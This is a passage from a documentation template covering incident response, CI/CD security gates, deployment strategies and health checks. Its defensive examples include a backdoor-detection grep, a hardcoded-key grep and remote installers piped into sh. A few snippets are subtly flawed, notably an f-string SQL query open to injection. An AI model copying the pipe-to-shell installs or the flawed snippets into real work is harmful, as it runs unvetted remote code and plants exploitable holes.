- [ ] Regular dependency updates (Dependabot/Renovate)
- [ ] Security advisories monitored (GitHub Security Advisories, npm advisories)
- [ ] Incident response plan for supply chain compromise
```

---

## 9. Quick Reference / Cheat Sheet

**Template Instructions**: Provide condensed, actionable information for quick lookup.

**Content to Include**:
- Command references
- API quick reference
- Configuration snippets
- Keyboard shortcuts
- Common operations
- Link to external resources

**Example Structure**:
```markdown
### Quick Reference Guide

**Common Commands**:
```bash
# [Operation 1]
[command] [options]

# [Operation 2]
[command] [options]
```

**Configuration Template**:
```[format]
[minimal working configuration]
```

**External Resources**:
- **[Resource Name]**: [URL] - [What it provides]
- **[Resource Name]**: [URL] - [What it provides]
```

---

## 10. Integration / Ecosystem Context

**Template Instructions**: Explain how this skill relates to others and the broader ecosystem.

**Content to Include**:
- Related skills/agents
- Integration points
- Dependencies
- Complementary tools
- Workflow positioning

**Example Structure**:
```markdown
### Integration with Other Skills

This skill integrates with:
- **[Related Skill 1]**: [How they work together]
- **[Related Skill 2]**: [How they work together]

### Workflow Position
[When in the development/deployment cycle this skill is used]

### Dependencies
- **Required**: [Skills/tools that must be present]
- **Optional**: [Skills/tools that enhance this one]
```

---

### 10.5 Incident Response Playbook (MANDATORY for HIGH-risk)

**Template Instructions**:
- **MANDATORY FOR**: HIGH-risk domains (production systems handling sensitive data)
- **RECOMMENDED FOR**: MEDIUM-risk domains
- **SKIP IF**: LOW-risk, internal-only systems

**Content to Include**:

```markdown
### Incident Response Framework

**Incident Classification**:
| Severity | Definition | MTTD Target | MTTR Target | Notification |
|----------|------------|-------------|-------------|--------------|
| **P0 - CRITICAL** | Complete service outage OR active data breach | <5 min | <1 hour | Page on-call + exec team |
| **P1 - HIGH** | Partial outage OR confirmed vulnerability exploit | <15 min | <4 hours | Alert on-call + security team |
| **P2 - MEDIUM** | Degraded performance OR potential security incident | <1 hour | <24 hours | Email security team |
| **P3 - LOW** | Minor issue OR false positive | <4 hours | <1 week | Log for review |

#### Phase 1: Detection (MTTD - Mean Time to Detect)

**Automated Detection Triggers**:
```[language]
# ✅ Automated alerts that trigger incident response

# 1. Security Alerts
- 5+ failed auth attempts from single IP in 1 minute → P2
- Privilege escalation detected → P1
- WAF blocking rate >100/min → P2
- Known attack signature in logs → P1
- Anomalous data access (100x normal) → P1

# 2. Availability Alerts
- Error rate >5% for 5 minutes → P0
- p99 latency >2 seconds for 5 minutes → P1
- Health check failures >50% of instances → P0

# 3. Infrastructure Alerts
- Unexpected outbound connections → P1
- File system modifications in /etc/ → P1
- New process spawned as root → P2
- CPU/memory >90% sustained → P2

# Alert Configuration
alertmanager:
  routes:
    - match:
        severity: critical
      receiver: pagerduty-critical
      group_interval: 1m
      repeat_interval: 5m

    - match:
        severity: warning
      receiver: slack-security
      group_interval: 5m
```

#### Phase 2: Containment (MTTR - Mean Time to Respond)

**Immediate Containment Actions** (< 30 minutes):
```markdown
### Security Incident Containment Checklist

**Step 1: Stop the Bleeding** (0-5 minutes):
- [ ] Block attacker IP at WAF/firewall
  ```bash
  # AWS WAF
  aws wafv2 update-ip-set --id $IP_SET_ID --addresses $ATTACKER_IP/32

  # Cloudflare
  curl -X POST "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/firewall/access_rules/rules" \
    -H "Authorization: Bearer $CF_API_TOKEN" \
    -d '{"mode":"block","configuration":{"target":"ip","value":"$ATTACKER_IP"}}'
  ```

- [ ] Revoke compromised credentials
  ```bash
  # Revoke API key
  aws secretsmanager update-secret --secret-id $SECRET_ID --secret-string "REVOKED"

  # Disable user account
  aws iam delete-access-key --access-key-id $COMPROMISED_KEY
  ```

- [ ] Isolate affected service (network segmentation)
  ```bash
  # Kubernetes: Update NetworkPolicy to deny all
  kubectl apply -f - <<EOF
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    name: isolate-compromised-service
  spec:
    podSelector:
      matchLabels:
        app: compromised-service
    policyTypes:
    - Ingress
    - Egress
  EOF
  ```

**Step 2: Enable Enhanced Logging** (5-10 minutes):
- [ ] Increase log verbosity
  ```[language]
  # Enable debug logging
  logger.setLevel(logging.DEBUG)

  # Log all requests
  app.use(morgan('combined'))
  ```

- [ ] Enable request tracing
  ```[language]
  # Trace all requests for forensics
  app.use((req, res, next) => {
    forensicsLog.info({
      timestamp: Date.now(),
      method: req.method,
      path: req.path,
      headers: req.headers,
      ip: req.ip,
      user: req.user?.id
    });
    next();
  });
  ```

**Step 3: Snapshot for Forensics** (10-15 minutes):
- [ ] Snapshot affected systems (DO NOT shut down yet!)
  ```bash
  # AWS EC2 snapshot
  aws ec2 create-snapshot --volume-id $VOLUME_ID --description "Forensic snapshot $(date)"

  # Copy logs to immutable storage
  aws s3 cp /var/log/ s3://incident-forensics-$INCIDENT_ID/ --recursive

  # Kubernetes: Copy pod logs
  kubectl logs $POD_NAME --all-containers > incident-$INCIDENT_ID-logs.txt
  ```

**Step 4: Assess Blast Radius** (15-30 minutes):
- [ ] Identify what was accessed
  ```sql
  -- Query audit logs for attacker's actions
  SELECT * FROM audit_log
  WHERE (user_id = 'compromised_user' OR ip_address = 'attacker_ip')
    AND timestamp > 'incident_start_time'
  ORDER BY timestamp;
  ```

- [ ] Check for lateral movement
  ```bash
  # Check for unauthorized access from compromised system
  grep "compromised-service" /var/log/auth.log
  grep "unauthorized" /var/log/syslog
  ```

- [ ] Identify affected users
  ```sql
  -- Find users whose data was accessed
  SELECT DISTINCT user_id FROM access_log
  WHERE accessed_by = 'compromised_account'
    AND timestamp > 'incident_start_time';
  ```
```

#### Phase 3: Eradication

**Remove Threat** (1-4 hours):
```markdown
### Eradication Checklist

- [ ] Patch vulnerability
  ```bash
  # Deploy fix
  git cherry-pick $FIX_COMMIT
  ./deploy-emergency-patch.sh
  ```

- [ ] Rotate ALL potentially compromised secrets
  ```bash
  # Rotate database password
  ./rotate-db-password.sh

  # Rotate API keys
  ./rotate-api-keys.sh

  # Rotate TLS certificates (if compromised)
  certbot renew --force-renewal
  ```

- [ ] Check for persistence mechanisms
  ```bash
  # Check for backdoors
  find / -name "*.php" -mtime -7 -exec grep -l "eval\|base64_decode" {} \;

  # Check for cron jobs
  crontab -l
  cat /etc/cron.d/*

  # Check for unauthorized SSH keys
  cat ~/.ssh/authorized_keys

  # Check for suspicious processes
  ps aux | grep -v "\[" | awk '{if($3>50.0) print $0}'
  ```

- [ ] Rebuild compromised systems from clean images
  ```bash
  # DON'T just patch - rebuild from known-good state
  kubectl rollout restart deployment/compromised-service
  kubectl wait --for=condition=ready pod -l app=compromised-service
  ```
```

#### Phase 4: Recovery

**Restore Normal Operations** (4-24 hours):
```markdown
### Recovery Checklist

- [ ] Verify patches deployed
  ```bash
  # Verify version
  curl https://api.example.com/version

  # Verify vulnerability fixed
  ./security-regression-test.sh
  ```

- [ ] Monitor for recurrence
  ```bash
  # Enhanced monitoring for 72 hours
  watch -n 60 'curl -s https://api.example.com/health | jq .'

  # Check for attack signatures
  grep "attack_signature" /var/log/app.log | tail -100
  ```

- [ ] Gradual traffic restoration
  ```bash
  # Canary deployment - 10% traffic first
  kubectl set image deployment/service container=image:patched
  # Monitor for 1 hour
  # If stable, scale to 100%
  ```

- [ ] Communicate to stakeholders
  ```markdown
  # Internal Communication Template
  Subject: Security Incident - Resolved

  Team,

  At 14:23 UTC on 2024-01-15, we detected and contained a security incident.

  **Impact**: [Describe what happened]
  **Root Cause**: [SQL injection in user search endpoint]
  **Containment**: Attacker IP blocked, vulnerability patched
  **Data Exposure**: ~10,000 user emails (names and emails only, no passwords)
  **Status**: RESOLVED

  **Next Steps**:
  - Security regression tests added
  - Enhanced monitoring deployed
  - Post-mortem scheduled for 2024-01-17
  ```
```

#### Phase 5: Post-Incident Review (Within 72 hours)

**Root Cause Analysis**:
```markdown
### Incident Post-Mortem Template

**Incident ID**: INC-2024-001
**Date**: 2024-01-15
**Duration**: 2h 15m (14:23 - 16:38 UTC)
**Severity**: P1 - HIGH

#### Timeline
| Time (UTC) | Event |
|------------|-------|
| 14:23 | WAF detected SQL injection attempts |
| 14:25 | On-call engineer paged |
| 14:30 | Attacker IP blocked |
| 14:45 | Compromised credentials revoked |
| 15:00 | Emergency patch deployed to staging |
| 15:30 | Patch deployed to production |
| 16:00 | Monitoring confirms attack stopped |
| 16:38 | Incident closed |

#### Root Cause
SQL injection vulnerability in `/api/users/search` endpoint due to string concatenation instead of parameterized queries.

#### What Went Well
- ✅ Detection was automated (WAF alert)
- ✅ MTTD: 2 minutes (target: <15 min)
- ✅ Runbook followed correctly
- ✅ Communication was clear

#### What Went Wrong
- ❌ Vulnerability existed for 3 months (should have been caught by SAST)
- ❌ No regression test for this attack vector
- ❌ Patch took 1h 7m to deploy (target: <1h)

#### Action Items
| Action | Owner | Due Date | Status |
|--------|-------|----------|--------|
| Add SQL injection regression test | Security Team | 2024-01-17 | ✅ Done |
| Enable SAST in CI/CD | DevOps | 2024-01-20 | 🔄 In Progress |
| Improve deployment speed | DevOps | 2024-02-01 | 📅 Planned |
| Security training for dev team | Security Team | 2024-02-15 | 📅 Planned |

#### Lessons Learned
1. SAST would have caught this during development
2. Security regression tests are MANDATORY for all vulnerabilities
3. Need faster emergency deployment process

#### Metrics
- MTTD: 2 minutes ✅ (target: <15 min)
- MTTR: 2h 15m ❌ (target: <1 hour for P1)
- Data Exposure: 10,000 records
- Estimated Cost: $X,XXX
```

#### Incident Response Checklist

**Preparation** (Before Incident):
- [ ] Incident response team designated
- [ ] Runbooks documented and tested
- [ ] Contact list updated (on-call, security team, exec team)
- [ ] Forensics tools ready (logs, snapshots, packet captures)
- [ ] Communication templates prepared

**Detection**:
- [ ] Alert received
- [ ] Severity assessed
- [ ] Incident declared
- [ ] Team notified

**Containment**:
- [ ] Attacker blocked (IP, credentials revoked)
- [ ] Affected systems isolated
- [ ] Logs preserved for forensics
- [ ] Blast radius assessed

**Eradication**:
- [ ] Vulnerability patched
- [ ] Secrets rotated
- [ ] Backdoors removed
- [ ] Systems rebuilt from clean state

**Recovery**:
- [ ] Patches verified
- [ ] Monitoring enhanced
- [ ] Services restored gradually
- [ ] Stakeholders notified

**Post-Incident**:
- [ ] Post-mortem completed within 72 hours
- [ ] Action items assigned with owners and deadlines
- [ ] Security regression tests added
- [ ] Runbooks updated
- [ ] Lessons learned shared with team
```

---

## 11. Troubleshooting / Debugging

**Template Instructions**: Provide diagnostic and problem-solving guidance.

**Content to Include**:
- Common issues and solutions
- Diagnostic commands
- Debug workflows
- Error message interpretations
- Recovery procedures

**Example Structure**:
```markdown
### Common Issues

#### Issue: [Problem Description]

**Symptoms**:
- [Observable sign 1]
- [Observable sign 2]

**Diagnosis**:
```bash
# Check [aspect]
[diagnostic command]
```

**Solution**:
1. [Step to resolve]
2. [Step to verify fix]

**Prevention**: [How to avoid in future]
```

---

## 12. CI/CD Pipeline & Deployment Strategies (MANDATORY for Production Systems)

**Template Instructions**:
- **MANDATORY FOR**: All MEDIUM/HIGH-risk production systems
- **SKIP IF**: Local-only tools, proof-of-concepts, internal scripts
- **INCLUDE**: Complete CI/CD pipeline, deployment strategies, health checks, rollback procedures

**Content to Include**:

### 12.1 CI/CD Pipeline Architecture

**Template Instructions**: Define complete pipeline from commit to production.

**Example Structure**:
```markdown
### CI/CD Pipeline

**Pipeline Stages** (ALL stages MUST pass before deployment):

```yaml
# .github/workflows/[service]-pipeline.yml (or .gitlab-ci.yml, Jenkinsfile, etc.)
name: [Service] CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  # Stage 1: Code Quality & Linting
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup [language]
        uses: [language-setup-action]
        with:
          [language-version]: '[version]'

      - name: Install dependencies
        run: [package-manager] install

      - name: Run linter
        run: [linter-command]  # e.g., eslint, pylint, golangci-lint

      - name: Check code formatting
        run: [formatter-check-command]  # e.g., prettier --check, black --check, gofmt

      - name: Check type safety (if applicable)
        run: [type-check-command]  # e.g., tsc --noEmit, mypy

  # Stage 2: Unit & Integration Tests
  test:
    runs-on: ubuntu-latest
    needs: lint
    services:
      # Test database
      [database]:
        image: [database-image]:[version]
        env:
          [DB_ENV_VARS]
        ports:
          - [port]:[port]

      # Test cache
      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379

    steps:
      - uses: actions/checkout@v3

      - name: Setup [language]
        uses: [language-setup-action]

      - name: Install dependencies
        run: [package-manager] install

      - name: Run unit tests
        run: [test-command] --coverage
        env:
          DATABASE_URL: [test-database-url]
          REDIS_URL: redis://localhost:6379

      - name: Run integration tests
        run: [integration-test-command]

      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@v3
        with:
          file: ./coverage.xml
          fail_ci_if_error: true
          flags: unittests
          name: codecov-[service]

      - name: Enforce coverage threshold
        run: |
          coverage report --fail-under=80  # Fail if coverage <80%

  # Stage 3: Security Scanning
  security:
    runs-on: ubuntu-latest
    needs: lint
    steps:
      - uses: actions/checkout@v3

      - name: SAST - Static Analysis
        run: [sast-tool]  # e.g., semgrep, bandit, gosec

      - name: Dependency Vulnerability Scan
        run: [dependency-scan-tool] audit  # e.g., npm audit, pip-audit, snyk

      - name: Fail on HIGH/CRITICAL vulnerabilities
        run: |
          [dependency-scan-tool] audit --audit-level=high

      - name: Container Image Scan (if applicable)
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: '[registry]/[image]:[tag]'
          severity: 'CRITICAL,HIGH'
          exit-code: 1  # Fail pipeline on findings

      - name: Secrets Detection
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD

  # Stage 4: Build & Package
  build:
    runs-on: ubuntu-latest
    needs: [test, security]
    steps:
      - uses: actions/checkout@v3

      - name: Build application
        run: [build-command]  # e.g., npm run build, go build, docker build

      - name: Build Docker image
        run: |
          docker build -t [registry]/[service]:${{ github.sha }} .
          docker tag [registry]/[service]:${{ github.sha }} [registry]/[service]:latest

      - name: Push to container registry
        run: |
          echo "${{ secrets.REGISTRY_PASSWORD }}" | docker login [registry] -u [username] --password-stdin
          docker push [registry]/[service]:${{ github.sha }}
          docker push [registry]/[service]:latest

      - name: Generate SBOM (Software Bill of Materials)
        run: [sbom-tool] generate  # e.g., syft, cdxgen

  # Stage 5: Deploy to Staging
  deploy-staging:
    runs-on: ubuntu-latest
    needs: build
    environment: staging
    steps:
      - name: Deploy to staging
        run: |
          [deployment-command] deploy staging \
            --image=[registry]/[service]:${{ github.sha }} \
            --wait

      - name: Run smoke tests
        run: |
          curl -f https://staging.[service].com/health || exit 1
          [e2e-test-command] --env=staging

  # Stage 6: Deploy to Production (manual approval)
  deploy-production:
    runs-on: ubuntu-latest
    needs: deploy-staging
    environment: production  # Requires manual approval
    if: github.ref == 'refs/heads/main'
    steps:
      - name: Deploy to production
        run: |
          [deployment-command] deploy production \
            --image=[registry]/[service]:${{ github.sha }} \
            --strategy=canary \
            --wait

      - name: Verify deployment
        run: |
          curl -f https://[service].com/health || exit 1
          curl -f https://[service].com/api/v1/healthz || exit 1
```

**Pipeline Success Criteria**:
- [ ] All linting checks pass
- [ ] Test coverage ≥80%
- [ ] Zero HIGH/CRITICAL security vulnerabilities
- [ ] Build succeeds without errors
- [ ] Staging smoke tests pass
- [ ] Health checks pass in production
```

#### 12.1.1 Security Gates & Quality Enforcement (MANDATORY for HIGH-risk)

**Template Instructions**:
- **MANDATORY FOR**: HIGH-risk production systems, systems handling PII/PHI/PCI data
- **RECOMMENDED FOR**: All MEDIUM-risk production systems
- **INCLUDE**: Automated security validation that BLOCKS deployment if criteria not met

**Purpose**: Prevent vulnerable code from reaching production through automated enforcement gates.

**Example Structure**:
```markdown
### Security Gates in CI/CD Pipeline

**Security Gate Philosophy**: Every deployment MUST pass ALL security gates. No manual overrides allowed for HIGH/CRITICAL findings.

#### Gate 1: Zero HIGH/CRITICAL Vulnerabilities (MANDATORY)

```yaml
# Add to CI/CD pipeline as mandatory gate
security-gate-vulnerabilities:
  runs-on: ubuntu-latest
  needs: [test, security]
  steps:
    - uses: actions/checkout@v3

    - name: Install security scanning tools
      run: |
        # Install dependency scanners
        [package-manager] install -g [dependency-scanner]  # e.g., npm audit, snyk, osv-scanner

        # Install SBOM tools
        curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh
        curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh

    - name: Scan dependencies for vulnerabilities
      run: |
        # Generate SBOM
        syft dir:. -o cyclonedx-json > sbom.json

        # Scan SBOM with grype (FAIL on HIGH/CRITICAL)
        grype sbom:sbom.json --fail-on high --only-fixed
      continue-on-error: false  # MUST fail pipeline

    - name: Scan container images (if applicable)
      run: |
        trivy image [registry]/[service]:${{ github.sha }} \
          --severity HIGH,CRITICAL \
          --exit-code 1 \
          --ignore-unfixed
      continue-on-error: false

    - name: Verify zero HIGH/CRITICAL vulnerabilities
      run: |
        # Double-check with multiple scanners for critical systems
        [dependency-scanner] audit --audit-level=high

        # For Python: pip-audit, safety
        # For Node: npm audit --audit-level=high, yarn audit --level high
        # For Go: govulncheck
        # For Java: dependency-check
```

**Gate Enforcement Policy**:
| Severity  | Action              | Override Allowed? |
|-----------|---------------------|-------------------|
| CRITICAL  | Block deployment    | NO                |
| HIGH      | Block deployment    | NO                |
| MEDIUM    | Warn + Track        | YES (with reason) |
| LOW       | Track only          | YES               |

#### Gate 2: Security Test Validation (MANDATORY)

```yaml
security-gate-tests:
  runs-on: ubuntu-latest
  needs: test
  steps:
    - name: Verify security regression tests exist
      run: |
        # Check for security test directory
        if [ ! -d "tests/security" ]; then
          echo "ERROR: No security tests found in tests/security/"
          exit 1
        fi

        # Count security test files
        TEST_COUNT=$(find tests/security -name "*test*" -type f | wc -l)
        if [ "$TEST_COUNT" -lt 5 ]; then
          echo "ERROR: Insufficient security tests (found: $TEST_COUNT, minimum: 5)"
          exit 1
        fi

    - name: Run security-specific tests
      run: |
        # Run tests tagged as security
        [test-command] --tags=security --fail-fast

        # Examples:
        # pytest -m security
        # go test -tags=security ./...
        # npm test -- --grep="security"

    - name: Validate authentication tests
      run: |
        # Ensure auth tests cover critical scenarios
        [test-command] tests/security/authentication/ --coverage

        # Verify coverage for:
        # - Invalid credentials
        # - Expired tokens
        # - CSRF protection
        # - Rate limiting
```

#### Gate 3: SBOM Generation & Validation (MANDATORY for Production)

```yaml
security-gate-sbom:
  runs-on: ubuntu-latest
  needs: build
  steps:
    - name: Generate SBOM (CycloneDX format)
      run: |
        # Generate comprehensive SBOM
        syft dir:. -o cyclonedx-json=sbom.json -o spdx-json=sbom-spdx.json

    - name: Validate SBOM completeness
      run: |
        # Check SBOM has required fields
        if ! grep -q "\"bomFormat\": \"CycloneDX\"" sbom.json; then
          echo "ERROR: Invalid SBOM format"
          exit 1
        fi

        # Count components (should have dependencies)
        COMPONENT_COUNT=$(jq '.components | length' sbom.json)
        if [ "$COMPONENT_COUNT" -lt 1 ]; then
          echo "ERROR: SBOM has no components"
          exit 1
        fi

        echo "SBOM generated with $COMPONENT_COUNT components"

    - name: Upload SBOM to artifact repository
      run: |
        # Store SBOM for supply chain tracking
        [artifact-tool] upload sbom.json \
          --name=[service]-sbom-${{ github.sha }}.json \
          --repository=[sbom-repository]

    - name: Scan SBOM for known vulnerabilities
      run: |
        grype sbom:sbom.json --fail-on critical --only-fixed
```

#### Gate 4: Secrets Detection (MANDATORY)

```yaml
security-gate-secrets:
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v3
      with:
        fetch-depth: 0  # Full history for secret scanning

    - name: Scan for committed secrets
      uses: trufflesecurity/trufflehog@main
      with:
        path: ./
        base: ${{ github.event.repository.default_branch }}
        head: HEAD
        extra_args: --only-verified --fail

    - name: Scan for high-entropy strings
      run: |
        # Detect potential API keys, passwords, tokens
        [entropy-scanner] scan --entropy-threshold=4.5 --fail-on-match

        # Example tools: detect-secrets, gitleaks, git-secrets

    - name: Validate secret management
      run: |
        # Ensure no hardcoded secrets in code
        if grep -r "api_key\s*=\s*['\"]" [source-directory]/; then
          echo "ERROR: Found hardcoded API key"
          exit 1
        fi

        # Check for placeholder usage
        if ! grep -q "\[SECRET_MANAGER\]" README.md; then
          echo "WARNING: No secret manager documentation found"
        fi
```

#### Gate 5: License Compliance (MANDATORY for Commercial Products)

```yaml
security-gate-licenses:
  runs-on: ubuntu-latest
  needs: build
  steps:
    - name: Scan dependency licenses
      run: |
        # Install license checker
        [package-manager] install -g [license-checker-tool]

        # Examples:
        # npm: license-checker, legally
        # Python: pip-licenses
        # Go: go-licenses
        # Java: license-maven-plugin

        [license-checker-tool] --summary

    - name: Enforce approved licenses only
      run: |
        # Define approved licenses
        APPROVED_LICENSES=(
          "MIT"
          "Apache-2.0"
          "BSD-2-Clause"
          "BSD-3-Clause"
          "ISC"
          "0BSD"
        )

        # Define forbidden licenses (copyleft for commercial products)
        FORBIDDEN_LICENSES=(
          "GPL-2.0"
          "GPL-3.0"
          "AGPL-3.0"
          "LGPL-2.1"
          "LGPL-3.0"
        )

        # Scan and validate
        [license-checker-tool] \
          --failOn "${FORBIDDEN_LICENSES[*]}" \
          --onlyAllow "${APPROVED_LICENSES[*]}"

    - name: Check for license files
      run: |
        # Verify LICENSE file exists
        if [ ! -f "LICENSE" ] && [ ! -f "LICENSE.md" ]; then
          echo "ERROR: No LICENSE file found"
          exit 1
        fi
```

#### Gate 6: Code Quality Metrics (RECOMMENDED)

```yaml
security-gate-quality:
  runs-on: ubuntu-latest
  needs: test
  steps:
    - name: Enforce test coverage threshold
      run: |
        # Fail if coverage below threshold
        COVERAGE=$(coverage report --format=total)
        MIN_COVERAGE=80

        if [ "$COVERAGE" -lt "$MIN_COVERAGE" ]; then
          echo "ERROR: Coverage $COVERAGE% below minimum $MIN_COVERAGE%"
          exit 1
        fi

    - name: Check code complexity
      run: |
        # Prevent overly complex code (harder to secure)
        [complexity-tool] --max-complexity 10 [source-directory]/

        # Examples:
        # JavaScript: eslint with complexity rule
        # Python: radon cc -n C  (fail on C-grade or worse)
        # Go: gocyclo -over 10

    - name: Validate security headers in responses
      run: |
        # For web services, test security headers
        [test-command] tests/security/headers_test.[ext]

        # Should verify presence of:
        # - Content-Security-Policy
        # - X-Frame-Options
        # - X-Content-Type-Options
        # - Strict-Transport-Security
```

**Combined Security Gate Job** (Alternative: Single Gate):

```yaml
# Alternative: Combine all gates into single job for faster execution
security-gates-combined:
  runs-on: ubuntu-latest
  needs: [test, security, build]
  steps:
    - uses: actions/checkout@v3

    - name: Setup security tools
      run: |
        # Install all security scanners
        curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh
        curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh
        [package-manager] install -g [dependency-scanner] [license-checker]

    - name: Run all security gates
      run: |
        #!/bin/bash
        set -e  # Fail on first error

        echo "=== Gate 1: Vulnerability Scanning ==="
        syft dir:. -o cyclonedx-json > sbom.json
        grype sbom:sbom.json --fail-on high --only-fixed

        echo "=== Gate 2: Secret Detection ==="
        trufflehog filesystem . --fail --only-verified

        echo "=== Gate 3: License Compliance ==="
        [license-checker-tool] --failOn "GPL-3.0,AGPL-3.0"

        echo "=== Gate 4: Security Test Validation ==="
        [test-command] --tags=security

        echo "=== Gate 5: SBOM Upload ==="
        [artifact-tool] upload sbom.json --name=[service]-sbom-${{ github.sha }}

        echo "✅ All security gates passed"

    - name: Block deployment on failure
      if: failure()
      run: |
        echo "❌ Security gate failed. Deployment BLOCKED."
        echo "Review security scan results and fix issues before deploying."
        exit 1
```

**Security Gate Monitoring**:

```python
# Monitor security gate pass/fail rates
class SecurityGateMetrics:
    def __init__(self):
        self.gates = [
            'vulnerability_scan',
            'secret_detection',
            'license_compliance',
            'security_tests',
            'sbom_generation'
        ]

    def track_gate_result(self, gate_name: str, passed: bool, duration_seconds: float):
        """Track security gate execution"""
        metrics.counter(
            'security_gate_executions',
            tags={
                'gate': gate_name,
                'result': 'pass' if passed else 'fail'
            }
        ).increment()

        metrics.histogram(
            'security_gate_duration',
            tags={'gate': gate_name}
        ).observe(duration_seconds)

    def calculate_gate_pass_rate(self, gate_name: str, days: int = 7) -> float:
        """Calculate pass rate for security gate"""
        query = f"""
        SELECT
            COUNT(CASE WHEN result = 'pass' THEN 1 END) * 100.0 / COUNT(*) as pass_rate
        FROM security_gate_executions
        WHERE gate = '{gate_name}'
          AND timestamp > NOW() - INTERVAL '{days} days'
        """
        return self.db.query(query)[0]['pass_rate']
```

**Security Gate Success Criteria**:
- [ ] Zero HIGH/CRITICAL vulnerabilities in dependencies
- [ ] Zero HIGH/CRITICAL vulnerabilities in container images
- [ ] No secrets detected in code or commits
- [ ] All security tests passing (minimum 5 tests)
- [ ] SBOM generated and uploaded
- [ ] All licenses approved (no GPL/AGPL for commercial)
- [ ] Test coverage ≥80%
- [ ] Security headers validated (for web services)

**Bypass Procedure** (Emergency Only - REQUIRES VP+ Approval):

```yaml
# Only for emergency production fixes (P0 incidents)
security-gate-bypass:
  if: contains(github.event.head_commit.message, '[EMERGENCY]')
  steps:
    - name: Validate emergency bypass approval
      run: |
        # Check for approval in commit message
        if ! echo "${{ github.event.head_commit.message }}" | grep -q "Approved-By:"; then
          echo "ERROR: Emergency bypass requires 'Approved-By: [VP Name]' in commit message"
          exit 1
        fi

    - name: Create security debt ticket
      run: |
        # Auto-create ticket to fix security issues post-deployment
        [issue-tracker-cli] create \
          --title="[SECURITY DEBT] Fix issues bypassed in ${{ github.sha }}" \
          --priority=P0 \
          --assignee="${{ github.actor }}" \
          --due-date="+2days"

    - name: Notify security team
      run: |
        # Alert security team of bypass
        curl -X POST [slack-webhook] -d '{
          "text": "🚨 Security gate bypassed for emergency deployment",
          "attachments": [{
            "fields": [
              {"title": "Commit", "value": "${{ github.sha }}"},
              {"title": "Author", "value": "${{ github.actor }}"},
              {"title": "Reason", "value": "Emergency P0 fix"}
            ]
          }]
        }'
```

**Gate Implementation Checklist**:
- [ ] All 6 security gates implemented in CI/CD pipeline
- [ ] Gates configured to FAIL pipeline (not just warn)
- [ ] SBOM generation automated for every build
- [ ] License compliance validated against approved list
- [ ] Secret detection scanning full git history
- [ ] Security test suite has ≥5 regression tests
- [ ] Monitoring dashboard tracks gate pass rates
- [ ] Emergency bypass procedure documented and approved
- [ ] Security gate failures trigger automatic Slack/PagerDuty alerts
```

---

### 12.2 Deployment Strategies

**Template Instructions**: Choose deployment strategy based on risk tolerance and architecture.

**Example Structure**:
```markdown
### Deployment Strategy: [Strategy Name]

**Chosen Strategy**: [Blue-Green / Canary / Rolling / Recreate]

**Rationale**: [Why this strategy for this domain]

#### Blue-Green Deployment

**Use When**:
- Zero-downtime requirement (MANDATORY for HIGH-risk)
- Need instant rollback capability
- Can afford duplicate infrastructure (2x cost during deployment)

**Implementation**:
```[config_format]
# Kubernetes example
deployment_strategy:
  type: blue-green
  steps:
    1_deploy_green:
      - Deploy new version to green environment
      - Run health checks on green
      - Run smoke tests on green

    2_switch_traffic:
      - Update load balancer to point to green
      - Monitor error rates for 5 minutes
      - If errors increase >1%, rollback to blue

    3_cleanup:
      - Keep blue environment for 24 hours (manual rollback option)
      - After 24h, decommission blue environment
```

**Rollback**:
```bash
# Instant rollback: Switch load balancer back to blue
[deployment-tool] switch-traffic --target=blue --immediate
```

#### Canary Deployment

**Use When**:
- Want gradual traffic shift (reduces blast radius)
- Can monitor metrics in real-time
- HIGH-risk domains with strict SLOs

**Implementation**:
```[config_format]
canary_deployment:
  phases:
    - name: 'Deploy canary'
      traffic_weight: 5%   # Route 5% of traffic to new version
      duration: 10m
      success_criteria:
        - error_rate < 0.1%
        - p99_latency < 500ms
        - no_5xx_errors: true

    - name: 'Increase to 25%'
      traffic_weight: 25%
      duration: 10m
      success_criteria: [same as above]

    - name: 'Increase to 50%'
      traffic_weight: 50%
      duration: 10m
      success_criteria: [same as above]

    - name: 'Full rollout'
      traffic_weight: 100%
      duration: 30m
      success_criteria: [same as above]

  rollback_on:
    - error_rate > 1%
    - p99_latency > 1000ms
    - any_5xx_errors: true
```

**Automated Rollback**:
```[language]
# Monitor canary metrics and auto-rollback on failure
def monitor_canary_deployment(deployment_id):
    for phase in canary_phases:
        set_traffic_weight(phase.traffic_weight)

        # Monitor for phase duration
        metrics = collect_metrics(duration=phase.duration)

        if not meets_success_criteria(metrics, phase.success_criteria):
            # Auto-rollback
            logger.error(f"Canary failed at {phase.name}: {metrics}")
            rollback_deployment(deployment_id)
            alert_team(f"Canary deployment failed at {phase.name}")
            return False

    return True  # Full rollout successful
```

#### Rolling Deployment

**Use When**:
- Limited infrastructure (can't afford blue-green)
- Medium-risk domains
- Acceptable to have brief mixed versions

**Implementation**:
```yaml
# Kubernetes RollingUpdate strategy
spec:
  replicas: 10
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1   # Never more than 1 pod down
      maxSurge: 2         # Can have 2 extra pods during rollout
  minReadySeconds: 30   # Wait 30s after pod ready before continuing
```
```

---

### 12.3 Health Checks & Readiness Probes

**Template Instructions**: MANDATORY for all production services. Define health endpoints and probe configuration.

**Example Structure**:
```markdown
### Health Check Implementation

**Health Endpoint** (MANDATORY):
```[language]
@app.get("/health")
def health_check():
    """
    Liveness probe: Is the service running?
    Returns 200 if service is alive (even if degraded)
    """
    return {"status": "healthy", "timestamp": datetime.utcnow()}

@app.get("/api/v1/healthz")
def detailed_health_check():
    """
    Readiness probe: Is the service ready to handle traffic?
    Checks dependencies (database, cache, external services)
    """
    checks = {
        "database": check_database_connection(),
        "cache": check_redis_connection(),
        "external_api": check_external_service(),
    }

    all_healthy = all(checks.values())
    status_code = 200 if all_healthy else 503

    return JSONResponse(
